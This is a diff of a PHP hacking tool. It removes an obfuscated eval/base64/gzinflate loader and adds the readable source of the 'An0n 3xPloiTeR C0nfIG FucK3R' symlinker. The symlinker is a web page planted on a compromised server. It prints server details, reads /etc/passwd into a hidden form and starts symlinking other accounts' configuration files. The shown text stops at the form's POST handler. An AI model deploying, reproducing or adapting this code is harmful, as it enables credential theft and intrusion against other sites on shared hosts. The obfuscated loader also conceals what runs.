@@ -1,16 +1,838 @@
-<?php
-/*
-		The Given Code Was Successfully Obfuscated By An0n 3xPloiTeR's Obfuscator :-)
-						From : http://localhost/obfuscator/obfuscator.php
-									Thanks For Using :D
-							Dont Forget To Like And Share <3
-		Dont Change The Variables Names And If You Change Obfuscated Code Wont Work Properly :-)
-							Changing Author's Name Wont Make You The Author :) ^_^
-									    #RespectCoders 
-								!!! ~ By An0n 3xPloiTeR ~ !!!
-*/
-$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
-$An0n_3xPloiTeR = "H1lU\x43\x63eV/P\x42vO5Xk26P3M\x41w/\x2b7o7FGm8fLITR\x2bHHytNoVVJHotS\x61M2087ujP64pOxrVhYls5\x42Rg7sS6\x2bNJqV/j895y5nEEY4F9M/\x62HgX\x63sNpxM/u\x2b\x62Hf\x618WLWU7QW\x42613z9JQ/lH\x43nJGz6/EJUR\x63EdP5U\x43TqvYXVo17\x43RoU\x62\x62q9Z11Fes\x61o\x42K8Duw\x61VZRg5R33hDrPZOZjjS6\x2bd4Ft\x42MMGF3vUI/7ZxRWS\x62IVKS375uQeyzD\x43RisXujOEn\x41OSodyeywFUmt3Kj9qGtEJtHY0JXdNGN431Pu/3lX1\x43nVn2i6Hkfrqh9\x62VJws/Fz\x41muqvV\x62oSqkDy2EReF/oTVLM8rDi798qmWM\x62zupKJ/z/vSdRKX\x2bL4x\x61K8\x63XQ\x63DZGx36J\x2bmNlu4K2IL5GmRrW7Qx9oytJD0ydqxW\x63uE0nQY\x62NYf\x2bQ\x61/efDtQkQJhFE6lJ/GDEPLFPVG5rHsD\x615WOj\x42\x63KR6zy\x43EIDJw55wiPdDO1Jj21\x62v4jpY\x2b\x2b\x41mjn\x41\x2buO\x42feqMd0stX4Je\x2bUgkJ/lTvuYfnY7FeMyeyXYj8L6UdJNrOYW\x434FW4D89OtsnmOPigVhY7RFGdD6Suy1K\x63vkFte3uhXhRP182K0mZ\x43/Qmzy\x41iXdKthLwZwJq\x41hR8Z\x42wq\x412kr8qJXZ90W\x2bF1ffO1iN\x42jMofFV\x610ieHz/NGjNnw0r/\x2bsSH3DYONjWZJf\x61RwL\x43FQ4P/0nHJniu\x2bzz\x61\x63oxfoyddpPOJ2xvqWi\x61sj6ttTh160\x41MJYT9hqq4UJ1GTXKG9L\x63qYXuqf1J3gXZS9WPTnGsg/Z\x41mjGHp6i3MxT\x42PM1FPlKggjJUx9\x63r75QHSxoke2L\x62jgTZglNGPgqqt9jK2\x42he\x43Uow\x41\x2bfm\x2bRf/q2QlNnGtd7F75KNTKx7QwypTM\x43O1p\x63\x61KqLZsTstiiV\x61O\x42vSKpIwX3LZv\x61UZYzxyvMN0xkTK99VuLz5xzsZLR\x43hsMMyutnz\x61\x62Z7E\x2bjFs4tS98jd\x41eXoVRl7I8RHj\x63P1\x621XDJkIyo3eGye\x61wW12l8M5\x62GH0\x63Efu/\x623F\x61EeMI8\x42\x63iDh\x625W1vhV4\x43yTTL\x427P\x43\x62Q/V\x2bVKPMqz6Pf\x2bIiyjIohWMv4M\x42J/rnReY\x2bsnuq23TeRH/V4\x41klj\x2bEGhkYh8esPioW76LhKzq\x4330\x43hHy0fknwkd5Q2yH2m3uHPxQHr9\x618eFLH\x2bhD84\x63f/smI3X\x61K\x63MyrX3vnVGvsleuV530Lj6Sxek19t3gsWU\x624Sr3Ep44\x63PSoXVUHfP0M\x43lrM\x62zWenoI\x62\x62p98\x62SirXN5huYWU71o717ljHv56\x428Hgmh3ey25o105l5P7/M86K2M6kNX3S6gkL69G\x63rpdOIZim\x2bZN\x2bsJjIoOjE\x2bUug8t9u5ThsE5Lz5lW5oGMKmw3/lYLRM8tRj4J2S1\x2b1VF78kxZyvY/5hsQ6hSi7OXh\x63\x61VxkM\x43qTVep71d\x41Kg6Y0h9/ytuT2P\x2b6izko\x62FQZUTV8s65y3\x2bUivLHr\x62\x42pr\x62OOvNs/tjUEZiNJ1KIeRT1GfsEgjpNEYT8GU8EQeQ\x42X\x42xUu4PZS8wD4\x2b\x43E3l5hv\x43/JHLEI\x412f1sExYymG4hIDiOKo4I\x43LDJ\x41hpG/JdK\x41ZNml1HQ\x42DhPqwKynnPJZ9r\x2bujghnIZZ6oUg/\x2bgsE7wqMP\x41\x43Z07J\x42Z\x61QGN\x418kgw\x41D\x423Ogi69HG0zw5KdgkEYP/\x61QXq4ddjZp0xEeNYjgGtOXP/yv\x61zN9\x41K\x43\x43xz\x43sF\x2bDN4VV\x41kwkDLuRyIujXfiD\x63Hfh5G\x41yI\x63g52xhoigEyPFey\x437ogt\x61s0OKZJKyDD6VE\x41glIIi7NKxn/Z\x2bjU4ZIrkoDLRioOr\x63gEyM\x41es5E\x41/huJwg3\x43\x41uu23Hr8k\x414g4JSoHtTmHMQqft/gG6\x62PY75DG\x41kH\x42eYRiEwu0\x61\x41/7i8\x41\x2bWhwEj9y/DNEEOsg\x42oT7M\x41oHWv1iPUdO4EfVk9g6hMKLJl\x61MRQDTpr\x43H09lxfmYJ5HXwT\x41KWk\x42\x41o\x42TqnqzU5l\x41tIy0E4i0\x42\x42/F4Yw1VoF7YrdKP\x62ElqN6K\x41\x63QpmRLG2V\x61We2kwHeK\x42YT\x63\x43\x41Ts\x6271Iq\x42k6S9Z\x424L\x42HQKXJ\x62\x63LHPmOE7Jdin9ZxP8\x42IOzO8YG7pFy\x42YNqT3wg\x42YYvSyP\x61JZ4\x41Rwy0M8T86izG\x63mLz0i\x415\x42\x61M4uK\x41QWI4g\x4182uJigTxsr\x42oYExe2\x41ye\x43\x43n\x41uEv7Oi/yek/oII7INpk\x41Ut2DVQdOo6\x42Qj\x425gu\x63uJtl\x4278\x4299Qp\x42T1S\x41mQ\x42Igejrk1E\x41e\x41Iulxm\x62\x42Kjf\x41oOj\x43Jn\x41Hk34eNrwuzIH\x2b3ExD2K\x61wOP\x613SWGoEuLx1tIvzy/GSppZ\x41RS7\x62\x61GL\x63\x42WDjKN4pvFSvpkIIO\x61oYj287w\x41e\x41Z4y\x419oTLlF\x41k6o\x43u7TzRlU\x41s\x2bOIjz\x41sy\x63mwZhIz\x42\x43MG\x61ZHOORMHgKmfgES4uRmOkTgX\x43X0W0RqrkS47\x62wEtEer6lOwQRKr8uLH2\x63F\x63L\x43IM0hLksQT\x61/\x61Q3DlXnJ9l\x2bh6\x61gU45fm\x62IGd20gfM5LSoHPj\x42\x43rMyTOL\x42Dynh\x638g\x43\x61DEY3/kE4LtrEYX\x41m\x42xqwRuO/5D630\x427iZe\x43NE\x63\x63Zw/m2Nw\x41JU5Ld\x63y\x43D2UKLstnGZdPgoEU6/GJogk\x43uH\x42\x62YxpO20KY193\x635YKFp\x61ju\x63g/7ZDte\x2bwgfNq/JneEIWd0DzNtd\x41Pg520s\x62XgRLyU9gQe2gFgXXQ\x63Dvl1\x427IfoZrvGYuGr5PP/H9/j\x61oJxey\x41z\x42Vqk6QhUozDugt\x2b/uL1U\x41w1wNFovgjqQPQE\x61EMglz\x41UW0j\x434\x42EIvQ\x42mkN1LJ\x42ure3oMRPe2xyveh5hIpWg2SssMoOfr\x2bng\x63yzOSY5ux5dtt/0SYQSoiMk9RD539oqROd1RoG\x63SGsGPrZ3Z\x42YLO8x\x631\x41wx8hGlx\x43TlZ\x2b9YRN\x62\x2b\x41e\x62gK\x63YjJZLsk\x2be2ll3QzJ\x428SeUqLgz\x2bsF2hDz1oxx2yk\x42F2l\x429G\x63txJ\x43MRpx\x42F1QYNZn\x42v3dEDN9\x43TeNY5D\x42MjM\x631RgWQf\x611G0Dyy4S\x427M6\x41Hh\x43urHff\x2beiJeXDPW2RE3SGY0\x43PpG62w\x42D6k4\x43VNxJNeXgt\x41Px/qRvDmxSGWqn7FPmHMgER9UT/\x42\x41QumDMr/\x61kSR\x41SMY\x41fqV12wwEuLKs3sS2gurWzUEYuSmVyYQ/KS4kRLoUN\x417Y\x42UVspTYz/NLDIiEE8Wx2\x61ZmW0Mml05L\x2bPqz40r\x63/5x1n6Rny\x2b1zLlvqxxlRqqq\x2b5vwUnQI\x62\x43M5Z5531F\x62RTD08\x62\x42/3\x41FsKS\x43xuE4iHwzY\x61Seir0jquGiRe249T5GHDZgSTMHzPNgP3HfPi95hVf4KLd7H\x61YEVVYUiH2Y\x43nur/eyUhV3MqMj3jnfyEvjdf\x43vWZeEMKm\x63tivqrT\x41X1GhZk/4neyVkJq\x2bWS3\x41IrjJlN\x42twIEYqfLM\x43IMIEu2\x62hQElnh0KrthZLhR2/Jh6sUMpIS6u\x62\x4316OHoYivU4NZrwD0PnwGrX\x42/lrMDkLVe6hDDUKJ/lN\x43T6ZPF\x61JX\x41UHm2qmSIwukQG2GYpfwsv6TK4TQdjFXlVNv\x2bDTRIH\x62JyUgI\x630777yrUFnv76w8MJJ7nEi5tR\x43OEMrdq\x42UnnwOl\x42qqP\x42WqTK\x627den\x62VkSz50V\x2bfRRu\x42QlxfNtzTIJ\x2bzdv82tLySKQ\x43T\x61yNX6n5JhxXRyS1FZTkw\x2bXL0TJF\x62Q4mrihZ8D\x63ZwPZopr\x43H/\x43UPF\x61slmN\x434\x632jMw/T832hv6oGjeMI5rVdj0N2ZFj8jvjE8o/G55n\x61t96kKt\x63hRj\x433/Sz\x43GtJ3PdKsqWn\x61pS1UzKs9\x61u2iXzp\x42W4\x61zGE1n2DiX1wPmdPJ\x63URSgf8/JX9oMFx/qL6DwQxUmgX0s\x6332mt0\x2bjr\x61mvOfO/180Z1E2DDn95\x4166\x61V67eWKIqZwxJKGwHsd5EWhyYKvpG\x62n\x4117Jp\x2bITTsTNPx2qDoYHQszIL\x62J/n8svJIQdg3gpqR1G4\x43nf\x63g\x43DMRh0Jsj8SDnsStKF9Q\x2b\x62GzD\x62xG\x43MMmow3j7Ti7LSyvQK/\x43nL6T9Opfu\x2b\x63QXO6xmL21ESzMwlT/XUsyXQleIqJz\x61gORdY\x63FFDgn7f3sm45pFDwk\x41po\x2b9DmEH\x43o/W1LKVR\x41\x63GPLQwWOIg1GkTHMlwVS\x43GHQiQRKNumH/v\x43\x62wWVGVWNX\x2bGV\x43n12PI\x62rDrht8\x2b8V5v\x62G/9Pl4oL8rGwUptvN4KYH5t7r06PQDrWwHTxv1s3Py8STWoKFn4UP\x63m0x6YzNStP\x415l6PiZl\x62\x41\x61DVF\x434r6Q9Xzo8sP1yxo\x61VX8\x43kkP3ZwLnx\x431l6oG1S\x62/03\x42\x42uRstqGzP1venzkqV5usEPnhvLd7\x41Y\x431j92qI5Nu0nE2U\x42tKLN6I/5URMleFQIO\x61Sl1Lu/XD7gjTm9zQNXyxqT9zrQKYDVR91oTQ\x417\x61q52H52w\x438mXYZMfY6/n77LsdRoJ0rLGzfN\x62zplXY6mHVtRr7i\x42\x61km5jjr\x2b00gn7kHLrYfPdR\x43XQrY0iRtIXpg\x42ikh\x62vZwoZhXStp\x41T45iPJ\x61YyVswrqyhgkTL\x631\x2b/eqU\x62DwwruQf\x42O\x2b\x61\x43EqXY0x5fPeuFI\x62s0xo9gEXts\x63Y41wP04R7r\x61g7e8\x42rT\x42pg\x2bZgvP8i\x2b3N\x61tL21MTd\x420XFuKM4P3vdjiGII\x61xH/eJdgx\x43d/ryv7s\x62\x2bRsdGq\x635\x43rtNvZr8d9TQNm9391K81p\x43l9pKdEoKIjHVNi\x43sirQh6FdrZ1ZuqP7//X\x2b\x2bhM\x63IR8\x42KW6SZ46\x61xof\x42uE8Xjk8\x61osDYH9SeXr\x2bnUOwO\x4236\x42ln8\x63J\x62K8tX0t2o\x61os\x4276\x2bwu\x2bhwYsuD98RUd2es89l3\x626p1MzjoPkXu/D7nJv5oniRp\x63k\x62FDU6yPdNw8dN5z0EK1Q9OQvMM\x43eOPK\x61lXjYY3KD\x623\x42oYz\x2blTL\x63\x63Y4W6KJpvEsuv\x62Rgr\x63FxqSw\x42t\x63YXKujv6fJ99ZnY17fyrEfrY\x62Q\x43k7JhPqzDWp4zNOrvx\x63psUv\x43W\x42QI2Vz52\x63WWKKHZkt6J\x415\x62\x613RKd\x62kGxsl\x41JSGo\x61nwIN\x43tt47l\x2bxvqW9\x62Ym\x2b0f\x4261f\x63s\x63lzu03tRUrFTtVJm\x61S8vOn5tNP9sNyM\x2b5q5DFrtGML5D1IIToEfPmz1\x617Yy8FY\x62FLf7n/esq\x41\x63Vw37YiXi18SlF9Y3M\x63JfDq5qzrT\x63\x62e0\x43\x2b1GOOxSslJSyhM5kjLuYVyXj6/ylT\x63Xuk5yYtfWWkVT\x61Nquy81mpk0uHgNLh\x2bnTu4\x41l\x610\x61iw\x62gt7NJ7\x61\x415IfyhY35OeUQUnkFkDXgrieZUZQ7F2fgJo3rgGzPe0vFRl9dxxYTw5VEILS0uv\x2b\x41Yp9e\x621EomLK\x42IP82G\x42EW\x63Fh\x63NL6GGjtrfTzIt\x41pRzvm\x41XGy\x42oF6j6Wlhz13Hj5kR\x2b/NRlhDxTK1WXj/\x2bv\x631NWYWnX8w4\x2bfDxkQZWPD29wS6f\x63dk3pp3ji1TksQ\x421Skpegq\x43IVS53s6Z8gQFrh/Ylfn\x63sDpUJnvyxZM1sfju1g2Ee8eEz2ZqfO\x63jEJITF1n5IMu\x42R\x2bovNL\x42yNLz3V\x62zl0msEFmjZNpUqn\x61GHugLV\x62OeV7tmynDRg\x63z\x61Zk0416V\x4132Jpsn3wn\x42FdxVNyueq1\x43zLdDVGLkvkUYWD3\x2bDno2lou/UoS\x62EhG6vWgD5fL\x2b7qfG/n5N\x42\x63\x2bH\x41Wz4wHx2v1lXYlgp\x61yHro9D0Hz2v\x41\x42Ldy\x620Gip9UQVzQzRFyJSO9/0Z7eJo4\x61xt5JwLYh0k3juHfU053lQEl\x41WqW\x62Ee\x429DtnQx\x62\x62/T\x63dsqh8VGJvEPUMkgf2sY1p\x61M4w0KIWM\x41mTPO8m\x41zq\x62PM9ZSnET\x61K4t\x2bnw9I\x62/\x438t8d\x62X35jelNTeN\x62OqQ\x43eOdGJK9D\x2b\x61xQ6sdmVKi1z6f/DVdeUfGO3EKd\x62XK\x63k1PGMngF\x42h9NF9\x42P7tJrWhIvTtqnvrP\x63M\x63LsIttTKhF9vp\x61rZDgqftH1hk67gk7lqmLJ\x2b5q\x41vp/47VvE9QpneXeGSiH1\x43etq0Gw/\x2b\x2b51Qxd7Xr3vQQzpFY\x2bhio/l9\x622y/TXZr\x62/zt6Mu\x621/E/hjYUNX\x2b/Sp8m\x2bUKdzS1qP9\x61q2v\x2bzTz15GPmpjdfGfgr4e\x2buVe\x63\x61Fd6T2yEefTsN\x61WyR\x62\x2b1y0P3yPm5gFuKWRKpqmOKHmqFnSsYZ\x41g1DLgo26u\x41//iLXWO8Hk1VMs04hhS/yjJi9Xx2GV2h5F50yZv8L7d9tDL\x43y\x4195uL6/hOtk032uwwR\x63qzwrE\x61z0\x2b\x6372\x41P1vHQj527kGM/\x41TFsjzeN3OP7xetEms/NK\x61RVu\x62I0xK\x428inxzXyuLHLVMMmvpiTXEWD\x2b\x2bo\x61WRFqu3ZRe8Vs\x62xTWT\x2bQ5iTOoTjGI0XsGjpwfgDezztfmgsXuz0NKy7yDFgTjHsdEk7\x42GU1vxqOsfw1EJDdgsOiIxgPsoWSK0V6NqNydf9QWN\x63FWjOH\x43wquXkJqk2Tyk76hiN\x62mv\x629Ig\x63FpSjk4i5\x615Ypr1I\x2bJLGggy\x41t2xwHXM\x623T\x61Y\x41xp\x63Mnx3\x2bzUL43Y\x43uow\x41W1zsQ34V0LpX\x62qJ\x43kv5JPusiU1\x61iTuZt7Ox5PK4xY/zZZSqX55/q19ePR\x2bXfL4qjR\x61H\x2b\x61UvhuKq\x43Dv\x63h\x61tqwd/8vqMFsDnF/30nRJxHX9Di1\x42K5MV88\x42mk\x63si4\x43l\x41eu\x62D/yios\x43LHp3rKf0ZfeF\x42f\x61fw\x43EF9Y2\x43ko\x2b5e9W3HNxJXROD8rmTTjWvQ/TX9n14f/uy\x63YD5Qmmpg41L21QELZG1lPEQ\x2brim21\x2byx0vNHhLhoM2fdwjroWkjzUWJuOekdo\x41n\x2b73Q\x43lY/03JWHf8hGxSYkWrlS\x2biFn\x434U//m4VQ7dKL6Z26gVk9hWTdiy\x43pDnHUev\x63RXTLK6PsTeX8L\x636iM\x43hdmT4gYpNYo7JfQpo\x61NiP\x41vTg4\x62RfRVQ1O\x63\x63I\x612LiVDSqeR0xpL\x42Nke7HxSQ9\x62Sp31/DW9N\x43rRWVVvWvfwdiyIPzP\x43\x63M2fSZyXP7\x43tSSnFGgd\x43\x63fT\x625ulFXtXFv5ne\x2b\x42\x42\x61O7uXijtulOKk7PvVR8xGSyhSpVvMsNDeT97S0\x41I1p5X\x63RuoquH5I359p4dXhX\x61yY9Z1l2MVXi\x42lsZ25RxXeQT00/KjiTS1/rhXSkdq\x61/\x42h7UVZ6O4\x2bz/uzs92U35Ox\x42\x62Ey1rm9\x2btlloiKWV\x2bvx3WOzmgW4g1/rjVe867h\x610t\x62pT23Qy7ePY9h\x43\x2b9Pz4\x2bl\x42jpy\x62OwJNING\x2bOt\x61yX\x621v/FpMqJ8\x2b28wr3sj\x42dhgm/tgI3u2tO0RH\x423Zjsdx\x423s1Ge3m/\x42fI\x42W4q\x62Gkjzf8\x42S2eGvdG\x61tXLWzx9\x63vH3PPGUSSjeNgxUU7qoz\x62vp0\x2blgiZ\x61\x61qgLPsN34Q/33\x62z81u\x43qX\x63YZIhOmJhYRJTDOP93vkOV\x2bo1IWIuoi3kKmwjOj\x2bKgq5zS/HWWOoE\x41QVn//WyWMEM9ySz1K75U\x2b\x63RN1\x62sqp\x63iluvoVqizxw6n3XTs7ovM3FDllP1OZlqXueyG8poXsFdE5wu\x61v0y7/QxOq/uPuv\x41KYP\x413V5pxdIv6pz4HO\x43R7f0fIlSqSX2kRz8\x43i\x42hWV\x42epPd2wrut\x2b3lGdMftfojr1jfMWW6nmN8yvk93hfs0\x62m82U3SoI\x42vooPLelm27DUGSu74/wmhR\x2bRsz6P\x43H8mi\x42\x430s2ZXK0vXudYFknK\x42U4TO4Rmk9y9U\x62k\x63X7oxheT\x63P7U9fPW7jpzeKpU2Tm\x61i07UDe\x2b/js8zlnY8NvO9TPRF/VyL5WNFX\x43VsDfnHzOn\x2bfv9\x62\x61mEu\x2bqPeYqT5VOegKqGlLFgGhR9y7jNM38qxT3\x2b\x63og//sH53/e3tfUu6UOLDQyp\x2bvuufLuYRJ\x2bw8tl8YMzq577\x42dG\x43L9uiIPGP9r\x61uv\x63Lv5VZpfYY\x61Xp\x62Xqj7\x43YspTrpRvldnrn6/q\x630250nI8dJoDp/\x43HksdyjO/dhv\x41zMU1u39VxHvojme\x2b6OXSou6xs3M97/9\x43\x2bHzeTJmG71PY\x43\x2bXOk6\x2bUxOIQ6eqyd/TO\x2bl\x43Q\x63l\x61\x62f\x63mYtj1sUzP6\x63vs3zo2\x2b4FyP9QX\x61Wrzlo3wdf\x62Q\x63tT\x63\x614vy3Xg4Txz1zyyrU7r2V1DHGNT9o79SV5X/vxIjk5eo8\x2bHfiidqx4yGv4G\x622O2kq\x2bEUw\x43s/PrVtt8Z3sIqU02/ZYXGev35X\x42hM2ouegt6JfsK8RohvlwOXprsvXrOVRlZ\x2b\x42PNsv\x631OJx\x62jmV\x42\x43Fdh\x43k4HJv9ZYUzW13y9yMt3YL\x62q/VO5nZm\x2bT12S\x6275n00\x43Fh\x639NyLV\x63I\x63t\x62y1/muHts\x63zY26pjU5FDy3\x630digx\x63H9u4l\x42yPFFrQvJvuqs1vwr2XlLTmGn6je1efiMRPxVlSfzwWgV9nz4IexojQNj\x43OwgXfnxGv\x419VMV\x42Dqw0rTxVE/20\x42q/hxf\x636lgHepI\x627JxU8697rH1ipqiGhd6\x62J\x2bK1TVpzdZnERR9hp7p\x61sipyZovqqDnnW4EntitrKK6Vk9zJrtuY\x424LIle3M5jZjusD\x619TYfWXfK7WPXo9tH5r9M2YZ\x62NmDyMsQ\x43kX3HLuNxk\x619jNwh\x430\x62\x42vGV\x62jGv\x61rUX2Fyfp\x4219/kPZGgT\x61o7OXsiT05hf\x63woKz\x63h8le1roN9vrhuRe3uxdtXPLViSey\x63iee1K\x627sXhJ4Ri/qUJjmx1\x41j5uV8FyoVGd\x62\x61uF2WeSt/\x43pVIttHzFt7Qe\x43NJL1P/8Vo\x2bV0ixXEWPU9sFk9zvL\x636\x41s\x42\x62Z9MVyvP\x630l\x432hXDgPxdrvOr5MDRnjsvIff8\x41T29\x62oFFVsJe9Z\x62Pk0mhn7\x636mylHuQ\x2b\x43DZUYz\x63zlfjO4RNHNFt\x2b\x61M7LZSnh7\x62noFJ1o8fSkLpeQqLuTq\x62NYwqISDWSxq5kLTe/364gk6Sr\x62q5Ji1Lhfin\x63y7pHjs1lPtolKlyNiuem\x639\x42izMNF9MRX8\x42fp4f1\x429i7zM\x2b2F5/8\x42\x42lQ1o\x2bORS2zD\x63xylS7EFGx2\x41HoUXhZNlU\x610YDoQY\x43RhqOS\x62gKkQ\x42Pv7QLYmViLLIPu2P15u\x63hd8l\x62PR2\x2bKGnlzP1Tzjfh5/L4oe\x43I2Z\x63d40H2dqQYtMzF35z245f\x2blKjhMdoV\x63ySQD9EfT7Vo7e\x63U9\x61\x63r13mZuFQRy5Mv4Dk6WOdjR3lXn5Pdq1Wk9iikJDjp\x2bsSM1Ut8RrH\x41ZZRdv0i\x41n5WLJNNLx1Dt\x63\x42qq8PQ2qiv\x63Qy9\x63Z6lSO1\x41P\x623l7jV2VGyG\x2b\x62Tze1tZ\x2bJZznf/F14x\x4145XZd9TtKOe72nXtq\x43dUx3\x43lSnnE\x2bWdKv\x63JVMVU\x63\x61\x63mD5xMq\x2b\x61nLNU2Zvmiq6ti0EVDOvon\x63NU0z3tY0dm\x41t\x2bqqxOspZ4\x429PF3kSGoyTlUdszUw4Gv3kFe5s3iYWVU2ROvJHsZs\x62mYQTr8Z2V9RmVw9VrrPO3UykUiM8h7\x63\x61shRE32wjwSlkv\x63Y\x63rPMRlVeyNjnTpT0fNS2Lq5m8W7X3\x42psY9i\x61s1\x2bD8rip/eUHdo\x61WGjXppWrft094\x41xE5Hqq\x42T7\x61\x421UyQZJHSMs\x62DVwH\x41\x62/q4OG\x43PVNj\x61\x62EO8\x43D\x2bxkxTGDsuP7O\x635EeuZ0XR/Gm\x63kKOFOLq\x63mHjSuqxNqK\x42Z6\x61y\x62E926pUlwp\x61h5RPiIl8YEOKFRs9\x634/tjHm\x429\x2b0y\x43\x62hfVKzslSS\x438IN03\x42KuOQxp4F\x43smpGw81E\x41M7tX\x63jy\x41\x2bZ34Yh\x2b\x41G45\x62NL\x63T82\x42UI\x2bw3WT2r\x2b1P\x63f\x63yWXr\x63Oxwxvqth\x43miK/\x43w3S4\x62iGtlXJy5g1\x635jotmOfyXKQ8MRX9rv\x42X\x2b0zNyK\x2b/7POnRdv1f1RdOTs\x611dQ\x43iRNH\x62hRLmQoIVz6zQop5ho2J\x63XYdxZJG3XRGz0/SX/tx8kE687UWS\x62fRt\x6342no9Yxz\x2bDZXz6\x61\x630OkMZP3tuW4\x62sd2YvOfOZz1i\x62l\x43LY\x62qpohuEV\x42l/5yUz\x62\x63MQ6kDy2UniEW\x62zOU\x2b/T90LD\x433oQ\x42zGGuT3p8np\x439\x2b0gG\x62GR1Q2I\x63XEuxpOfjmhoL\x42kMUm6nVsqiVMsk31Ks5i\x41UXnWy\x420\x434RmUnRIOqHDI4XSqjthmn\x2bmoyk8sdOw0q\x2bVMVi7lzmytR5Oedi\x2bp13JTH\x42l\x61d\x62RUW\x616xfs28I85mQ\x62qG\x41KqK25v76n0lnxF\x61gny\x610Km7XNRFv\x62vGliynsPuWP0d1f6s5\x62pFmM5Vft\x43/om4PutVlvGv\x43UIhzPdFL6S3TN7VH\x62m42HUf\x63g4DUsY6OYS7v\x41\x612qt8\x42fdMs\x62IZi0Uth1LIlXQE6pr58/q3Lh8iOkEpW\x61m68F2pdOItYv8sW\x2bHy7NQsxG/FGH7Np/03\x41\x43f5V\x2b/\x2b47WI\x2buh\x4362h/jVrxdNhRfX\x41nvdyhko0\x620jrnVJu7zuI35kpzi\x62U488tVd3d/kVyq67WU4QY23Tlrje\x41\x61qr60esxzqEmMzK6k9\x615np\x61R13kr/uLjpMzugYNP3y7\x42oNYPpo6T/PFEV7rj3/nZv5xt//GW4s74Pzvf1\x414\x2b6hv92Tott\x2bOziY\x43/uJog7fxGPZT5Qyn9/JZd6POw2jw9om\x61e3gZ94W\x62oERDjEvjd8Q\x42\x63hudGwgzP0G6\x63X2zNzn7U\x2bMd\x2b8\x63/9\x2bf75M9EFyEiGUd99uRre3qEg1Ief/qyioLs2J6D6NiFVNriKx9iGFW\x43WVkE8xxT3NXg\x63HldwJeijQH3Hg4D0\x42/\x42wJehjvHHEQ4z7\x42D\x42wJehjuHXEQ4j7\x42H\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
-exit;
-?>
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>An0n 3xPloiTeR C0nfIG FucK3R</title>
+        <link rel='SHORTCUT ICON' href='http://i66.tinypic.com/2j33a85.jpg' />
+        <meta charset="UTF-8" />
+        <meta name="description" content="An0n 3xPloiTeR C0nfIG FucK3R" />
+        <meta name="location" content="An0n 3xPloiTeR C0nfIG FucK3R" />
+        <meta http-equiv="refresh" content="3600"><!-- For Refreshing Page After 3600 Intervals of time -->
+        <meta name="working" content="An0n 3xPloiTeR C0nfIG FucK3R" />
+        <meta name="about" content="An0n 3xPloiTeR C0nfIG FucK3R" />
+        <meta name="author" content="An0n 3xPloiTeR, Umar Arfeen Shah" />
+        <meta name="keywords" content="An0n, 3xPloiTeR, C0NFIG, FUCK3R, An0n 3xPloiTeR C0nfIG FucK3R" />
+        <meta name="revisit-after" content="1200" />
+        <meta name="language" content="en" />
+        <meta name='rating' content='general' />
+        <meta name='generator' content='google' />
+        <meta name='msnbot' content='follow,all' />
+        <meta name='alexabot' content='follow,all' />
+        <meta name='geo.placename' content='pakistan' />
+        <meta name="googlebot" content="index,follow,all" />
+        <meta http-equiv="X-UA-Compatible" content="IE-edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
+        <script language='JavaScript1.2'>
+            function ejs_nodroit(){
+                alert ('An0n 3xPloiTeR C0nfIG FucK3R');
+                alert ('Made By An0n 3xPloiTeR');
+                alert ('Although There Are No Copyrights But You Aren\'t Supposed To Copy My Code :\'(');
+                alert ('Got Your Ip: <?php $ip_address = $_SERVER["REMOTE_ADDR"]; echo $ip_address; ?> And Reported To An0n 3xPloiTeR :-)');
+                return(false);
+            }
+            document.oncontextmenu = ejs_nodroit;
+        </script>
+        <style>
+            body {
+                background-color: #080510;
+            }
+            a {
+                color: red;
+                text-decoration: none;
+            }
+            a:hover {
+                color: teal;
+            }
+            .heading {
+                text-align: center;
+                font: 300% impact;
+                margin-top: 1vh;
+            }
+            .server_info {
+                text-align: center;
+                font-size: 110%;
+                margin-top: 2vh;
+                color: lawngreen;
+                font-family: cursive;
+            }
+            .safe_mode_on {
+                text-align: center;
+                font-size: 100%;
+                color: red;
+                font-family: cursive;
+            }
+            .safe_mode_off {
+                text-align: center;
+                font-size: 100%;
+                color: green;
+                font-family: cursive;
+            }
+            .symlinker {
+                text-align: center;
+                font-size: 110%;
+                margin-top: 2vh;
+                color: lawngreen;
+                font-family: cursive;
+            }
+            .symlink_done {
+                text-align: center;
+                font-size: 120%;
+                margin-top: 2vh;
+                color: lawngreen;
+                font-family: cursive;
+            }
+            .footer {
+                text-align: center;
+                font: 25px impact;
+                color: white;
+                position: fixed;
+                bottom: 1vh;
+                left: 0vh;
+                right: 0vh;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="heading">
+            <font>
+                <span style="color: white;">Symlinker By</span> 
+                <span style="color: red;">An0n 3xPloiTeR</span>
+            </font>
+        </div>
+        <div class="server_info">
+            <font>
+                <?php 
+                    echo "<span style='color: green;'>Uname:</span> ".$server_name = php_uname();
+                    echo "<br>";
+                    echo "<span style='color: green;'>Server Software:</span> ".$server_software = $_SERVER['SERVER_SOFTWARE'];
+                    $safe_mode = ini_get("safe_mode");
+                    if ($safe_mode == "1") {
+                        echo "<div class='safe_mode_on'><font>Safe Mode: On</font></div>";
+                    } else {
+                        echo "<div class='safe_mode_off'><font>Safe Mode: <span style='color: lawngreen;'>Off</span></font></div>";
+                    }
+                ?>
+            </font>
+        </div>
+        <div class="symlinker">
+            <font>
+                <?php
+                    echo "
+                    <form action='' method='POST'>
+                        <input style='margin-top: 10vh; font: 130% impact; background: green; border-radius: 4px; border: 1px solid lime; color: white; line-height:40px; padding-left:10px;padding-right:10px;' type='submit' name='submit' value='Click To Start Symlinking' />
+                        <textarea name='passwd' style='display:none;' rows='11' cols='90'>";
+                            echo file_get_contents('/etc/passwd');
+                        echo "</textarea>
+                    </form>
+                    ";
+
+                    if (isset($_POST['submit'])) {
